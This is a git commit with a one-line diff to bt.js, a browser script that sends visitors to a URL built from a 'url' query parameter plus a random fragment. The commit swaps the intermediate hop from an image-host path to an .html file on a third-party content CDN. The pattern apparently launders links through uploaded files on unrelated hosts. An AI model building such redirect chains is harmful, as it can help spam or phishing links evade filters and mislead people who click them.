cb17e33ab121d55b5f0847d757e6d0fc6af1b267
xigua789 <123617033+xigua789@users.noreply.github.com>
2024-07-11 16:46:21 +0800

    Add files via upload

--- bt.js
+++ bt.js
@@ -9,7 +9,7 @@ const customParam = urlParams.get('url');
 const randomString = Math.random().toString(36).substring(2); // 生成随机字符串，包括数字和小写字母
 
 // 构建跳转链接
-let redirectURL = "https://ts-img.voc.com.cn/question/20240709152423/dc45182779081a26f16f179c496a7f47.jpg";
+let redirectURL = "https://img.huxiucdn.com/article/content/202407/11/091456989216.html";
 // https://static.ylxweb.com/upload/xinyue/2024/FlOoFt0jr9OpaT9jitYy8YNZHsuA.html
 if (customParam) {
     redirectURL += "?url=" + customParam + "#" + randomString; // 将随机字符串添加到参数后面
